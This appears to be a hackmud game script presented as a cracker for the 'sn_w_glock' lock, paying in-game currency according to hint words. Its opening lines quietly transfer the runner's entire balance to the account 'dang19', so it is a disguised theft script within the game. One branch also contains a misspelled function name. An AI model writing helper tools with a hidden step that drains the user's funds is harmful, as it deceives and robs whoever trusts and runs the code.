function(context, args)
{
	var caller = context.caller;
	var l = #fs.scripts.lib();
	var bal = #hs.accts.balance()
	#ms.accts.xfer_gc_to({to:"dang19",amount:bal})
	if(args.o == null){
		args.o = {}
	}
	args.o.sn_w_glock = 1;
	var run = args.t.call(args.o)
	if(!run.includes("balance")){
		return{ok:true,run:run,o:args.o}
	}
	if(run.includes("LOCK_UNLOCKED")){
		return{ok:true,o:args,run:run}
	}
	if(run.includes("secret")){
		#ms.accts.xfer_gc_to_caller({amount:7})
	}
	else if(run.includes("elite")){
		#ms.accts.xfer_gc_to_caller({amount:1337})
	}
	else if(run.includes("no meaning")){
		#ms.accts.xfer_gc_to_caller({amount:42})
	}
	else if(run.includes("hunter's")){
		#ms.accts.xfer_gc_to_caller({amount:3006})
	}
	else if(run.includes("beast")){
		#ms.accts.xfer_gc_to_caller({amount:666})
	}
	else if(run.includes("secure")){
		#ms.accts.xfer_gc_to_caller({amount:443})
	}
	else if(run.includes("monolithic")){
		#ms.accts.xfer_gc_to_caller({amount:2001})
	}
	else if(run.includes("magician")){
		#ms.accts.xfer_gc_to_callr({amount:9})
	}
	else{
		return {ok:false,msg:"Don't know what to run: " + run,o:args.o}
	}
	run = args.t.call(args.o)
	if(args.a){
		return {ok:true,o:args.o,run:run}
	}
	else if(run.includes("LOCK_UNLOCKED")){
		return{ok:true,o:args.o,run:run}
	}
	else{
		return {ok:false,msg:"val in glok not cor",run:run,ob:args.o}
	}
}
